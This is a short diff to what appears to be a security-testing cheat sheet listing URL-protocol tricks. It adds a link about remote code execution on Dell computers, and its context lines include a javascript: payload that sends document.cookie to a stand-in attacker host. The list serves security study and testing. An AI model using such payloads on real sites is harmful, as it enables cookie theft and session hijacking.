@@ -363,6 +363,7 @@ Clone:
 - Request URL protocol
     - `view-source:file:///foo`
     - `javascript:window.location='attacker_host'+document.cookie`
+    - ` http://`: [Remote Code Execution on most Dell computers](https://billdemirkapi.me/remote-code-execution-on-most-dell-computers/)
 - localhost ip octal / hexadecimal / 32bit integer / classful network encoding
     - e.g.
         ```
